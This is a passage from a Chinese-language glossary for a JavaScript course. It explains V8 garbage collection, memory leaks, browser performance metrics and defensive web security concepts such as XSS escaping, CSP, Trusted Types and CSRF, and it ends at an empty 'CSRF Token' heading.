分代回收基于「**分代假设**」：绝大多数对象**朝生夕死**（临时字符串、中间结果），而少数对象会存活很久（配置、缓存、长生命周期服务）。既然两类的生命周期特征截然不同，就分而治之——**新生代**用便宜的算法频繁回收，**老生代**用昂贵的算法低频回收。关键细节：分代带来一个必要的机制——**写屏障与记忆集**，因为回收新生代时需要知道「老生代对象是否引用了新生代对象」（否则会误删活对象）；对象经过若干次新生代回收仍存活后会被**晋升（promote）**到老生代，而一次错误的晋升（比如一个大数组长期被引用）会让老生代膨胀、触发昂贵的大回收。

**常见误解**：以为分代是「按对象年龄排序的优化技巧」。它是对**真实分配模式**的统计规律的应用，这也是为什么「减少短命对象分配」对吞吐帮助最大。

也见 [Scavenge（新生代回收）](#scavenge新生代回收)、[Mark-and-Sweep（标记清除）](#mark-and-sweep标记清除)、[Garbage Collection / GC（垃圾回收）](#garbage-collection-gc垃圾回收)。

示例：[`31_performance_and_memory/12_gc_internals.js`](31_performance_and_memory/12_gc_internals.js)

### Scavenge（新生代回收）

Scavenge 是 V8 回收**新生代**所用的算法：把新生代内存分成两块（`from`/`to`），回收时从根出发扫描存活对象，把它们**复制**到另一半空间并紧凑排列，然后整块丢弃原来那一半。它的两个优点都来自「复制」：回收成本只与**存活对象数量**成正比（而不是与总分配量成正比，因为死对象不需要逐个处理），而且复制天然完成了内存整理、没有碎片。关键细节：新生代的典型配置只有几 MB，「存活对象少」是它高效的前提，因此 `--max-semi-space-size` 调大反而可能让每次回收更慢；存活过两轮的对象会被晋升到老生代。

**常见误解**：以为 Scavenge 和标记清除是同一套算法的不同参数。它们思路完全不同——一个是「复制存活者」，一个是「标记垃圾」。

也见 [Generational GC（分代回收）](#generational-gc分代回收)、[Mark-and-Sweep（标记清除）](#mark-and-sweep标记清除)。

示例：[`31_performance_and_memory/12_gc_internals.js`](31_performance_and_memory/12_gc_internals.js)

### Mark-and-Sweep（标记清除）

标记清除是回收**老生代**的基础算法，分两阶段：**标记**——从根集合出发遍历所有可达对象并打上标记；**清除**——扫描整片堆，把没有标记的对象的内存回收。它不移动存活对象，因此适合处理大对象与数量众多的存活对象；代价是会产生**内存碎片**，长期运行后可能出现「总空闲内存足够但没有一块连续的够大空间」的情况，为此 V8 还会做**标记整理（mark-compact）**——在标记之后把存活对象挪到一起。关键细节：标记阶段需要遍历整个对象图，所以成本与**堆中的对象总数**相关（即使其中绝大多数是垃圾），这正是「老生代回收比新生代慢得多」的原因。

**常见误解**：以为「清除」是立刻把内存还给操作系统。多数情况下内存只是回到引擎的空闲列表中以供后续分配复用，进程的 RSS 未必下降。

也见 [Scavenge（新生代回收）](#scavenge新生代回收)、[Retained Size（保留大小）](#retained-size保留大小)、[Heap Snapshot（堆快照）](#heap-snapshot堆快照)。

示例：[`31_performance_and_memory/12_gc_internals.js`](31_performance_and_memory/12_gc_internals.js)

### Reachability（可达性）

可达性是 GC 判断「对象是否还有用」的唯一标准：**从根集合出发，沿引用链能走到的对象就是活的**。根集合包括全局对象、当前执行栈上的局部变量与参数、闭包捕获的变量、以及正在被 `WeakRef` 之外的方式持有的对象。这个定义解释了很多反直觉的现象——一个对象即使「业务上早就没用了」，只要还有一条引用链指向它（数组里的一项、闭包里的变量、事件监听器的回调捕获），GC 就绝不会回收它。关键细节：因此排查泄漏的思维方式是「**从根到该对象找出那条引用链**」，堆快照的「Retainers（保留者）」视图正是为此设计的。

**常见误解**：以为「离开作用域 = 立刻可回收」。作用域只是不再持有引用的一个原因，闭包、缓存表、未注销的监听器都可能让引用存活得远比你想的久。

也见 [Memory Leak（内存泄漏）](#memory-leak内存泄漏)、[Retained Size（保留大小）](#retained-size保留大小)、[Garbage Collection / GC（垃圾回收）](#garbage-collection-gc垃圾回收)。

示例：[`31_performance_and_memory/12_gc_internals.js`](31_performance_and_memory/12_gc_internals.js)

### Memory Leak（内存泄漏）

内存泄漏指**不再需要的内存因为仍被引用而无法被回收**，表现为进程内存持续增长、GC 越来越频繁且停顿变长，最终 OOM 崩溃。JS 里最常见的五种模式是：意外的**全局变量**（漏写 `const` 或挂到 `globalThis`）、**未清理的定时器**（`setInterval` 的回调闭包一直持有外部状态）、**闭包持有大对象**（一个函数返回小闭包，却捕获了整个大数组）、**无上限的缓存或集合**（Map 只增不减、数组当队列只用 `push`）、以及**分离的 DOM 节点**（节点已从文档移除，但 JS 里还有引用，监听器也还在）。关键细节：防御手段除了逐个排查，还包括用 `WeakMap`/`WeakRef` 让缓存不阻止回收、为所有订阅与定时器配对 `off`/`clear`、以及给缓存设容量上限或 TTL。

**常见误解**：以为「内存上升就是泄漏」。内存占用随负载上升、GC 之后回落，是正常的；泄漏的特征是**在压力消失后内存不回落**，所以判断前要先触发一次 GC 并观察基线。

也见 [Reachability（可达性）](#reachability可达性)、[Heap Snapshot（堆快照）](#heap-snapshot堆快照)、[WeakRef / WeakMap（弱引用）](#weakref-weakmap弱引用)。

示例：[`31_performance_and_memory/09_memory_leak_patterns.js`](31_performance_and_memory/09_memory_leak_patterns.js)

### Heap Snapshot（堆快照）

堆快照是**把某一时刻堆上所有对象及其引用关系完整导出**的一份文件（Chrome DevTools 的 `.heapsnapshot`，Node 用 inspector 或 `v8.writeHeapSnapshot`）。分析的标准三步法是：**先触发 GC 再拍基线快照**，操作一段时间后**再拍第二张**，然后用 Comparison 视图按 `# Delta` 排序——**增长最快且数量持续增加的对象**就是嫌疑对象；接着用 Retainers 视图从该对象出发**反向查找「谁在引用它」**，一路走到根，那条链就是泄漏路径。关键细节：快照会暂停程序且文件可能几百 MB，因此尽量在能复现问题的环境下拍、并注意两次快照之间不要有无关操作干扰。

**常见误解**：以为「对象数量多就是泄漏」。数量多但稳定说明是正常缓存或数据结构；泄漏的判据是**两次快照之间持续净增长**且看不出合理的业务原因。

也见 [Retained Size（保留大小）](#retained-size保留大小)、[Memory Leak（内存泄漏）](#memory-leak内存泄漏)、[Profiling（性能剖析）](#profiling性能剖析)。

示例：[`31_performance_and_memory/13_memory_profiling.js`](31_performance_and_memory/13_memory_profiling.js)

### Retained Size（保留大小）

保留大小指「**该对象被回收后能一并释放的内存总量**」，也就是它独占支配（dominator）的所有对象的大小之和。它区别于 **Shallow Size（浅大小）**——后者只是对象自身占用的字节数（一个数组的浅大小可能只有几十字节，而它引用的十万个元素不算在内）。关键细节：排查泄漏时**看保留大小而不是浅大小**，因为真正的内存往往「挂」在一个小对象下面（一个 Map 的浅大小很小，但它保留了几百 MB 的值）；支配树的层级决定了「删掉哪个引用收益最大」——删掉支配树上位置最高的那个引用，就能一次性释放整棵子树。

**常见误解**：以为「这个对象只有 100 字节所以不是它」。100 字节的对象可能是几百 MB 数据的唯一入口，这正是必须看保留大小的原因。

也见 [Heap Snapshot（堆快照）](#heap-snapshot堆快照)、[Reachability（可达性）](#reachability可达性)。

示例：[`31_performance_and_memory/13_memory_profiling.js`](31_performance_and_memory/13_memory_profiling.js)

### WeakRef / WeakMap（弱引用）

弱引用是**不阻止 GC 回收对象**的引用：`WeakMap`/`WeakSet` 的键、以及 `WeakRef` 指向的目标，只要没有其它强引用存在，就可以被回收，而对应的缓存项会自动消失。这让「给对象附加缓存或元数据」不再构成泄漏——用普通 `Map` 做缓存，键对象被永久持有；换成 `WeakMap`，键被回收时条目自动清除。关键细节：`WeakMap` 的键必须是对象（原始值无法被弱持有），且**不可枚举**（正因为条目随时可能消失，遍历会得到不确定结果）；`WeakRef` 的 `deref()` 可能返回 `undefined`，配合 `FinalizationRegistry` 可以在回收后执行清理，但**回收时机不确定**，绝不能把「依赖清理必然发生」的逻辑建在上面。

**常见误解**：以为 `WeakMap` 是「性能更好的 Map」或「能遍历的缓存」。它唯一的语义价值是「不阻止回收」，也正因如此它不提供 `size` 与遍历。

也见 [Memory Leak（内存泄漏）](#memory-leak内存泄漏)、[Garbage Collection / GC（垃圾回收）](#garbage-collection-gc垃圾回收)。

示例：[`31_performance_and_memory/10_weakref_and_gc.js`](31_performance_and_memory/10_weakref_and_gc.js)

### Long Task（长任务）

长任务指**占用主线程连续超过 50 毫秒的任务**，这个阈值来自「人机交互的响应预算」——超过它，用户输入就无法在 100ms 内得到视觉反馈，表现为点击无反应、滚动卡顿、输入延迟。浏览器会把超过 50ms 的任务标记出来（PerformanceObserver 的 `longtask` 条目），它的时长直接关联 INP 指标。常见成因是一个大循环处理十万条数据、一次同步的大 JSON 解析、复杂的正则回溯、大量 DOM 操作、或一次同步的布局计算。关键细节：长任务的危害不仅是「慢」，更是**阻塞事件循环**——期间所有定时器、点击、渲染都被推迟；解法是拆分为多个小任务（时间切片）或挪到 Worker。

**常见误解**：以为「优化到 45ms 就安全了」。长任务频繁出现（哪怕每次 60ms）同样会造成持续的交互延迟，减少**总阻塞时间**比压低单次峰值更重要。

也见 [Time Slicing（时间切片）](#time-slicing时间切片)、[Yield to Main Thread（让出主线程）](#yield-to-main-thread让出主线程)、[INP（INP）](#interaction-to-next-paint-inpinp交互到下次绘制)。

示例：[`31_performance_and_memory/14_long_tasks_and_scheduling.js`](31_performance_and_memory/14_long_tasks_and_scheduling.js)

### Time Slicing（时间切片）

时间切片是把**一个长任务拆成多个不超过几十毫秒的小块**，每块之间让出主线程，使浏览器有机会处理输入与渲染。例如渲染一万条列表项时，不写 `for (一万次) render()`，而是每处理 100 条就 `await` 一次让出，让页面保持可交互。关键细节：切片的粒度是关键权衡——切得太碎会让总耗时因调度开销变长，切得太粗则达不到响应要求（一般每片控制在 5~50ms）；让出方式从「`setTimeout(0)`」演进到「`await new Promise(r => setTimeout(r))`」「`requestIdleCallback`」「`scheduler.yield()`」，后者能真正回到事件循环末尾而不是插队；同时切片会让**执行顺序不再连续**，必须处理「用户在此期间又触发了新操作」的情况。

**常见误解**：以为切片能让总工作量变少。总时间通常**变长**（多了调度开销），换来的是**交互响应性**，这是有意的取舍。

也见 [Long Task（长任务）](#long-task长任务)、[Yield to Main Thread（让出主线程）](#yield-to-main-thread让出主线程)、[Virtual List / Windowing（虚拟列表与窗口化）](#virtual-list-windowing虚拟列表与窗口化)。

示例：[`31_performance_and_memory/14_long_tasks_and_scheduling.js`](31_performance_and_memory/14_long_tasks_and_scheduling.js)

### Yield to Main Thread（让出主线程）

让出主线程指**主动结束当前任务、把控制权交还事件循环**，让排队的用户输入与渲染先得到处理。它是时间切片得以生效的机制，也是「协作式调度」的核心：JS 没有抢占式线程调度，一个任务一旦开始就会跑到结束，所以「不卡」这件事只能靠代码自己让路。关键细节：让出的方式分三档——宏任务（`setTimeout`，会排到所有现有任务之后，可能引入 4ms 以上的延迟）、`MessageChannel`（更快但仍然排在渲染之后）、以及 `scheduler.yield()`/`requestIdleCallback` 这类感知优先级的 API；选择哪一档取决于「用户输入的处理优先级是否必须高于我的剩余工作」。还要注意**让出点会打破同步假设**：让出前后的状态读取之间，其它代码可能已经改了数据。

**常见误解**：以为 `await` 一个已解决的 Promise 就等于让出。微任务会在当前宏任务结束前全部清空，`await Promise.resolve()` **不会**让浏览器插进来渲染或处理点击。

也见 [Time Slicing（时间切片）](#time-slicing时间切片)、[Long Task（长任务）](#long-task长任务)、[INP（INP）](#interaction-to-next-paint-inpinp交互到下次绘制)。

示例：[`31_performance_and_memory/14_long_tasks_and_scheduling.js`](31_performance_and_memory/14_long_tasks_and_scheduling.js)

### Virtual List / Windowing（虚拟列表与窗口化）

虚拟列表（窗口化渲染）只把**可视区域附近的那十几条数据渲染成 DOM**，其余用「上下两块等高的空白占位」撑出总滚动高度，滚动时按 `scrollTop` 计算该显示哪一段并复用 DOM 节点。它解决的是「一万条数据生成一万个 DOM 节点」导致的初始化耗时数秒、内存占用巨大、滚动卡顿的问题——因为浏览器处理 10 万个 DOM 节点的代价是压倒性的，而屏幕上永远只能显示十几行。关键细节：实现要点有三——总高度与偏移量的计算、滚动事件的节流、以及**变高行**的处理（需缓存已测高度或用估算 + 动态校正）；列表项的 key 必须稳定，否则复用会串数据。

**常见误解**：以为虚拟列表是「滚动加载更多」的别名。无限滚动只是分批**追加**数据，DOM 总数仍会无限增长；虚拟化的关键在**回收**已有节点，两者可以并用但目标不同。

也见 [Time Slicing（时间切片）](#time-slicing时间切片)、[Reflow / Layout Thrashing（重排与布局抖动）](#reflow-layout-thrashing重排与布局抖动)。

示例：[`31_performance_and_memory/15_virtual_list.js`](31_performance_and_memory/15_virtual_list.js)

### Web Vitals（Web 核心指标）

Web Vitals 是 Google 提出的一组**用来衡量真实用户体验的指标**，其中三项被列为「核心指标（Core Web Vitals）」：**LCP**（加载快不快）、**INP**（响应快不快）、**CLS**（页面稳不稳），此外还有 TTFB、FCP 等辅助指标。它们之所以重要，是因为它们**以用户为中心**而不是以技术为中心——「首字节 200ms」这种服务器视角的指标未必对应「用户觉得快」。关键细节：指标要采**真实用户数据（RUM）**而不是只在实验室环境测，因为设备、网络与用户行为的分布差异极大；用 PerformanceObserver 采集后上报，并关注**75 分位数**而不是平均值（平均值会被大量快用户拉低，掩盖尾部体验）。

**常见误解**：以为 Web Vitals 只关乎 SEO。把它当成「用户实际体验的可量化代理指标」更准确，评分高低本身就是产品体验问题。

也见 [LCP（LCP）](#largest-contentful-paint-lcplcp最大内容绘制)、[CLS（CLS）](#cumulative-layout-shift-clscls累积布局偏移)、[INP（INP）](#interaction-to-next-paint-inpinp交互到下次绘制)。

示例：[`31_performance_and_memory/16_web_vitals.js`](31_performance_and_memory/16_web_vitals.js)

### Largest Contentful Paint / LCP（LCP，最大内容绘制）

LCP 测量**视口内最大的那块内容元素完成渲染的时刻**，通常就是用户感知到的「页面主要内容出现了」的时间点。它是「加载速度」这一维度的核心指标，良好阈值是 2.5 秒以内。关键细节：LCP 元素通常是首屏大图、大标题或视频海报，因此优化手段集中在——让关键图片**尽早被发现**（不要用 JS 动态插入、不要放在懒加载后面）、用 `fetchpriority="high"` 与 `preload` 提升优先级、压缩图片并用现代格式、减少阻塞渲染的 CSS 与同步脚本、以及用 CDN 缩短首字节时间。要注意**页面加载过程中 LCP 元素会更新**（通常是越换越大），最终上报取最后一次。

**常见误解**：以为 LCP 是「页面 load 事件的时间」。`load` 衡量的是所有资源加载完毕（可能很晚），LCP 衡量的是用户看到主要内容的时间（可能很早），两者差了十万八千里。

也见 [Web Vitals（Web 核心指标）](#web-vitalsweb-核心指标)、[CLS（CLS）](#cumulative-layout-shift-clscls累积布局偏移)、[INP（INP）](#interaction-to-next-paint-inpinp交互到下次绘制)。

示例：[`31_performance_and_memory/16_web_vitals.js`](31_performance_and_memory/16_web_vitals.js)

### Cumulative Layout Shift / CLS（CLS，累积布局偏移）

CLS 量化**页面在加载过程中「意料之外地跳动」的程度**：把每次布局偏移的影响面积与其移动距离相乘，累加成整个会话的分数，良好阈值是 0.1 以下。它衡量的不是速度而是**视觉稳定性**，直接对应「我刚要点按钮，广告加载出来把它挤走了，我点错了」这类糟糕体验。关键细节：最常见的成因是**没有尺寸的图片/视频/iframe**（加载后撑开空间）、**动态插入的横幅与广告**、**后加载的字体导致文字重排（FOIT/FOUT）**、以及先渲染骨架再被真实内容替换时的尺寸不一致。对策是给媒体元素显式写 `width`/`height` 或 `aspect-ratio`、为动态内容预留空间、用 `font-display` 与预加载字体减少文字替换。

**常见误解**：以为「用户主动触发的布局变化」也算 CLS。由用户交互（点击、滚动）直接引起的偏移在测量窗口内会被排除——CLS 针对的是**用户没做任何事时页面自己动了**。

也见 [Web Vitals（Web 核心指标）](#web-vitalsweb-核心指标)、[LCP（LCP）](#largest-contentful-paint-lcplcp最大内容绘制)、[Reflow / Layout Thrashing（重排与布局抖动）](#reflow-layout-thrashing重排与布局抖动)。

示例：[`31_performance_and_memory/16_web_vitals.js`](31_performance_and_memory/16_web_vitals.js)

### Interaction to Next Paint / INP（INP，交互到下次绘制）

INP 测量**用户的一次交互（点击、按键、触摸）到界面出现视觉反馈之间最长的耗时**，取代了旧的 FID 成为「响应性」维度的核心指标，良好阈值是 200 毫秒以内。它比 FID 严格得多：FID 只测「输入事件的排队延迟」，而 INP 覆盖整个交互生命周期——事件处理函数执行、可能的异步等待、以及随后的渲染，取的是**整次访问中最差的那次交互**（高分位数）。关键细节：改善 INP 的手段就是缩短长任务、拆分耗时工作、让出主线程、以及避免在事件处理里做同步的重活（大循环、布局读取）；调试时用 Performance 面板的 Interactions 轨道可以看清一次交互的时间都花在哪一段。

**常见误解**：以为「事件处理函数跑得快就够了」。视觉反馈还包含后续的渲染，如果处理函数很快但你紧接着又启动了另一个长任务，用户仍然看不到任何变化。

也见 [Long Task（长任务）](#long-task长任务)、[Yield to Main Thread（让出主线程）](#yield-to-main-thread让出主线程)、[Web Vitals（Web 核心指标）](#web-vitalsweb-核心指标)。

示例：[`31_performance_and_memory/16_web_vitals.js`](31_performance_and_memory/16_web_vitals.js)

### Reflow / Layout Thrashing（重排与布局抖动）

**重排（reflow/layout）**是浏览器在几何信息变化后重新计算元素位置与尺寸的过程，它比**重绘（repaint）**昂贵得多，而重排之后往往还要重绘再加合成。**布局抖动**指代码在循环里交替「写 DOM」与「读布局属性」——写操作让布局标记为脏，紧接着的读操作（`offsetHeight`、`getBoundingClientRect`、`scrollTop`、`getComputedStyle`）强制浏览器**同步**把布局算完，于是每轮循环都触发一次强制重排，几十次循环就把一帧的预算耗光。关键细节：解法是**读写分离**——先集中读完所有需要的布局值存进变量，再集中写；批量插入用 `DocumentFragment` 或在循环外拼好 HTML；动画优先用 `transform`/`opacity`（只触发合成，不触发布局）。

**常见误解**：以为「重排只发生在修改尺寸时」。读布局属性同样能触发**强制同步布局**，这是最容易被忽略的一类抖动来源。

也见 [Long Task（长任务）](#long-task长任务)、[Virtual List / Windowing（虚拟列表与窗口化）](#virtual-list-windowing虚拟列表与窗口化)、[CLS（CLS）](#cumulative-layout-shift-clscls累积布局偏移)。

示例：[`31_performance_and_memory/07_batch_dom_updates.js`](31_performance_and_memory/07_batch_dom_updates.js)

### Rope（绳索结构）

Rope 是 V8 内部表示**拼接出来的字符串**的一种数据结构：`+=` 不会每次都重新申请内存并复制全部字符，而是把结果表示成「左半 + 右半」的树形节点（ConsString），字符只在真正需要（如取长度以外的随机访问、正则匹配）时才被「拉平」成一段连续内存。这解释了为什么「字符串拼接很慢」这个来自其它语言的直觉在 JS 里并不总成立——连续拼接的摊销成本接近线性。关键细节：拉平是有代价的一次性成本，因此「先拼一万次再取值」通常很快，而「拼一次就取长度、再拼一次再取值」会反复触发拉平；在需要极致性能且有明确规模时，用数组 `join` 或直接构建仍更可控。

**常见误解**：以为「字符串不可变 = 每次拼接都全量复制」。不加区分的说法会让人做出错误的优化（比如为了「性能」把可读的模板字符串换成数组拼接，收益其实微乎其微）。

也见 [Benchmark（基准测试）](#benchmark基准测试)、[Big O（大 O 表示法）](#big-o大-o-表示法)。

示例：[`31_performance_and_memory/06_string_concatenation.js`](31_performance_and_memory/06_string_concatenation.js)

## 安全

### Threat Model（威胁模型）

威胁模型是**在动手防御之前，先系统地问清楚「谁、会怎么攻击我、我有哪些资产、最坏会怎样」**。一个常用的拆解框架是四个问题：我们构建什么、什么会出错、我们打算怎么应对、我们做得够好吗；配套工具是 STRIDE 之类的分类表（仿冒、篡改、抵赖、信息泄漏、拒绝服务、权限提升）。关键细节：它的价值在于**排序**——安全资源永远有限，威胁模型让你优先处理「高可能性 × 高影响」的风险，而不是被一篇标题党文章吓得先去修一个你根本没有的问题；威胁模型必须随功能演进而更新，并在新功能设计阶段就做，因为事后补安全的成本要高得多。

**常见误解**：以为威胁模型是「大公司才做的事」。哪怕只用一张纸写下「我们的攻击者是谁（脚本小子还是竞争对手）、他们最可能从哪进来（用户输入、第三方依赖、内部员工）」，也已经比无差别地堆防御有效得多。

也见 [OWASP Top 10（OWASP 十大安全风险）](#owasp-top-10owasp-十大安全风险)、[Defense in Depth（纵深防御）](#defense-in-depth纵深防御)、[Principle of Least Privilege（最小权限原则）](#principle-of-least-privilege最小权限原则)。

示例：[`32_security_and_best_practices/19_owasp_checklist.js`](32_security_and_best_practices/19_owasp_checklist.js)

### Input Validation（输入校验）

输入校验是**在数据进入系统的边界处检查它是否符合预期**，是所有安全防御的第一道也是最基础的一道。它的核心原则是「**白名单优于黑名单**」：白名单描述「什么是对的」（这个字段必须是 1~64 个字符的邮箱格式），黑名单描述「什么是坏的」（过滤 `<script>`），而攻击面的枚举永远不可能穷尽——`<script>`、`<SCRIPT>`、`<scr\0ipt>`、事件属性、`javascript:` 协议、编码绕过……黑名单的每一次遗漏都是漏洞。关键细节：校验应当**在服务端强制进行**（客户端校验只为体验，可被完全绕过）；校验要检查**类型、长度、范围、格式、集合成员**，而不是只查有没有特殊字符；并且校验后的数据要**以规范化形式**继续流转（校验一次、信任后续），否则就会出现「查过的和用的是两个值」的经典漏洞。

**常见误解**：以为「做了输入校验就不需要输出转义」。校验管的是完整性，转义管的是注入——同一个值进入 HTML、进入 SQL、进入 shell 需要完全不同的处理方式。

也见 [XSS（跨站脚本攻击）](#xss-cross-site-scripting跨站脚本攻击)、[SQL Injection（SQL 注入）](#sql-injectionsql-注入)、[Parameterized Query（参数化查询）](#parameterized-query参数化查询)。

示例：[`32_security_and_best_practices/01_input_validation.js`](32_security_and_best_practices/01_input_validation.js)

### XSS — Cross-Site Scripting（跨站脚本攻击）

XSS 指攻击者**把可执行的脚本注入到你的页面里，让它以你的站点身份在受害者的浏览器中运行**——于是它就能读取 Cookie 与 localStorage、冒充用户发请求、篡改页面内容、记录键盘输入。三种类型：**存储型**（恶意内容存进数据库，所有访问者都中招，危害最大）、**反射型**（恶意内容藏在链接参数里，诱导点击后立即执行）、**DOM 型**（漏洞在客户端 JS 里，服务端根本没参与，比如把 `location.hash` 直接写进 `innerHTML`）。关键细节：防御的核心是**按上下文转义**——插进 HTML 文本要转 `<`/`>`/`&`/引号，插进属性、JS 字符串、CSS、URL 里各有各的规则，用「一套通用转义」是没有意义的；更现代的防御是 CSP 与 Trusted Types（见下）。

**常见误解**：以为「用了框架就自动免疫」。React/Vue 的默认插值确实会转义，但 `dangerouslySetInnerHTML`、`v-html`、以及把用户输入交给 `href`/`src` 时防线立刻消失。

也见 [CSRF（跨站请求伪造）](#csrf-cross-site-request-forgery跨站请求伪造)、[CSP（内容安全策略）](#csp-content-security-policy内容安全策略)、[Escaping（转义）](#escaping转义)。

示例：[`32_security_and_best_practices/02_xss_prevention.js`](32_security_and_best_practices/02_xss_prevention.js)

### Escaping（转义）

转义是**把有特殊含义的字符替换成在各目标语言中「只表示它自己」的形式**，从而让数据无法被解释成代码。它对 XSS、SQL 注入、模板注入、日志注入都适用，但**同一份输入在不同上下文里需要不同的转义**：放进 HTML 文本要处理 `& < > " '`，放进 HTML 属性还要考虑属性引号，放进 `<script>` 内部要避免 `</script>` 与 `<!--`，放进 URL 要用百分号编码，放进 SQL 则是参数化（见下）。关键细节：「转义」与「过滤/校验」是两件事——校验决定**要不要接受**这个值，转义保证**接受之后它不会被当成代码**；只做其中一件都不够。

**常见误解**：以为存在「一个万能的转义函数」。跨上下文的转义会互相破坏（HTML 转义后的内容放进 URL 又会被百分号编码一次），这也是现代框架用「类型化的安全字符串」（如 Trusted Types）来强制区分上下文的原因。

也见 [XSS（跨站脚本攻击）](#xss-cross-site-scripting跨站脚本攻击)、[CSP（内容安全策略）](#csp-content-security-policy内容安全策略)、[Trusted Types（可信类型）](#trusted-types可信类型)。

示例：[`32_security_and_best_practices/02_xss_prevention.js`](32_security_and_best_practices/02_xss_prevention.js)

### CSP — Content Security Policy（内容安全策略）

CSP 是一份通过 HTTP 响应头（或 `<meta>`）下发的**浏览器侧白名单策略**，用来声明「这个页面只允许从哪里加载脚本/样式/图片/字体、只允许连哪些地址」。它把 XSS 的防线从「我转义得对不对」变成「浏览器替我拦住不在白名单里的脚本」——即使某处转义漏了，注入的 `<script>` 也会被拒绝执行。关键细节：CSP 是**声明式、可上报**的（`report-uri`/`report-to` 能收到违规报告），因此上线策略应当先用 `Content-Security-Policy-Report-Only` 观察一段时间再切换到强制模式；`unsafe-inline` 与 `unsafe-eval` 会让策略形同虚设，而一旦放宽了这些，最常见的补偿手段就是 nonce 或 hash（见下）。

**常见误解**：以为「加了 CSP 就安全了」。CSP 是**纵深防御的一层**，不是转义的替代品；它防不住 DOM 型 XSS（数据根本不出现在 HTML 里）、也防不住通过白名单域（如公共 CDN）投放的恶意脚本。

也见 [Nonce（一次性随机数）](#nonce一次性随机数)、[Trusted Types（可信类型）](#trusted-types可信类型)、[SRI（子资源完整性）](#sri-subresource-integrity子资源完整性)。

示例：[`32_security_and_best_practices/13_csp_advanced.js`](32_security_and_best_practices/13_csp_advanced.js)

### Nonce（一次性随机数）

nonce（number used once）是 CSP 用来放行**少量内联脚本**的机制：服务端为每次响应生成一个不可预测的随机串，把它写进 CSP 头的 `'nonce-<值>'`，同时给合法的 `<script nonce="<值>">` 标上同一个值——于是只有「服务端亲手签发的这一批脚本」被允许执行。它的精髓是**随机性与一次性**：攻击者注入的内联脚本无法猜测当次的 nonce，因此被拦截。关键细节：nonce 必须**每次响应用密码学安全的随机数重新生成**（用 `Math.random` 或复用固定值等于自废武功），必须**不能出现在缓存内容里**（CDN 缓存整页会让所有用户共享同一个 nonce），且应当配合 `strict-dynamic` 使用以支持被信任脚本动态加载的模块。

**常见误解**：以为「nonce 是给用户会话用的令牌」。它不标识身份、不做鉴权，只是一个「本次响应的脚本白名单标签」，用完即弃。

也见 [CSP（内容安全策略）](#csp-content-security-policy内容安全策略)、[Secure Random（安全随机数）](#secure-random安全随机数)、[Trusted Types（可信类型）](#trusted-types可信类型)。

示例：[`32_security_and_best_practices/13_csp_advanced.js`](32_security_and_best_practices/13_csp_advanced.js)

### Trusted Types（可信类型）

Trusted Types 是一项浏览器 API 与配套 CSP 指令，用来**从根上消灭 DOM 型 XSS**：在开启强制策略后，任何可能执行代码的「危险接收点」（`innerHTML`、`outerHTML`、`insertAdjacentHTML`、`document.write`、`eval`、`script.src` 等）**只接受经过安全策略处理的 TrustedHTML/TrustedScript/TrustedScriptURL 对象**，直接传字符串会抛错。于是「把不可信数据拼进 innerHTML」这个最常见的漏洞模式在语法层面就写不出来了。关键细节：需要用 `trustedTypes.createPolicy()` 显式定义「哪里允许保留 HTML」（通常是经过净化的富文本），因此启用它是一个**需要改造代码的过程**，通常先用 `require-trusted-types-for` 的 report-only 模式收集违规点。

**常见误解**：以为它能替代转义。Trusted Types 强制你**为每个危险写入点明确表态**，但策略本身（比如用哪个净化库）仍要你来选；把策略写成「原样放行」只是把漏洞换了个地方。

也见 [CSP（内容安全策略）](#csp-content-security-policy内容安全策略)、[XSS（跨站脚本攻击）](#xss-cross-site-scripting跨站脚本攻击)、[Escaping（转义）](#escaping转义)。

示例：[`32_security_and_best_practices/13_csp_advanced.js`](32_security_and_best_practices/13_csp_advanced.js)

### CSRF — Cross-Site Request Forgery（跨站请求伪造）

CSRF 指攻击者**诱导已登录用户的浏览器，向你的站点发出一条用户并不知情的、携带身份凭证的请求**——浏览器会自动带上该站点的 Cookie，服务器看到合法的会话就直接执行了操作（转账、改密码、删数据）。关键在于攻击者**不需要读到响应**，只需要让请求发出即可，因此 `HttpOnly` Cookie 并不能阻止它。防御手段有五类：**CSRF Token**（表单/头里带一个攻击者猜不到的值，服务端校验）、**SameSite Cookie**（限制跨站请求是否携带 Cookie）、**校验 Origin/Referer**、**关键操作要求重新认证**、以及**避免用 GET 做状态变更**。关键细节：CSRF 的前提是「浏览器自动附带凭证」，因此用 `Authorization` 头携带令牌的 API（不依赖 Cookie）天然免疫；而 XSS 能绕过所有 CSRF 防御（它能直接读到 Token），所以两者的关系是「防住 XSS 才能谈 CSRF 防御」。

**常见误解**：把 CSRF 与 XSS 混为一谈。**XSS 是「把恶意代码注入你的页面」，CSRF 是「借用用户的身份发请求」**；XSS 需要注入点，CSRF 不需要，XSS 的危害通常更大（可以做到 CSRF 能做的一切）。

也见 [XSS（跨站脚本攻击）](#xss-cross-site-scripting跨站脚本攻击)、[SameSite（SameSite Cookie 属性）](#samesitesamesite-cookie-属性)、[CSRF Token（CSRF 令牌）](#csrf-tokencsrf-令牌)。

示例：[`32_security_and_best_practices/11_csrf.js`](32_security_and_best_practices/11_csrf.js)

### SameSite（SameSite Cookie 属性）

SameSite 是 Cookie 的一个属性，用来控制**跨站请求时该 Cookie 是否会被发送**，取值有三：`Strict`（任何跨站请求都不带，从外站链接点进来时用户会短暂处于未登录态）、`Lax`（默认值，顶层导航的 GET 请求会带上，POST、iframe、`fetch` 等跨站子请求不带）、`None`（一律带上，但**必须同时设置 `Secure`**，只能走 HTTPS）。它是浏览器提供的 CSRF 防线中最省事的一层——绝大多数 CSRF 攻击依赖的正是「跨站发起的 POST 请求自动带上 Cookie」，`Lax` 直接切断了这条路。关键细节：`Lax` 并不覆盖所有场景（`GET` 型的状态变更仍然危险），所以它应当与 CSRF Token 配合而非互相替代；跨站需要 Cookie 的合法场景（嵌入式支付、SSO 回调）必须显式声明 `SameSite=None; Secure`。

**常见误解**：以为「设了 SameSite 就不用 Token 了」。`Lax` 对顶层 GET 导航是放行的，如果业务里存在「用 GET 改数据」的接口，这条路依然敞着。

也见 [CSRF（跨站请求伪造）](#csrf-cross-site-request-forgery跨站请求伪造)、[CSRF Token（CSRF 令牌）](#csrf-tokencsrf-令牌)。

示例：[`32_security_and_best_practices/11_csrf.js`](32_security_and_best_practices/11_csrf.js)

### CSRF Token（CSRF 令牌）

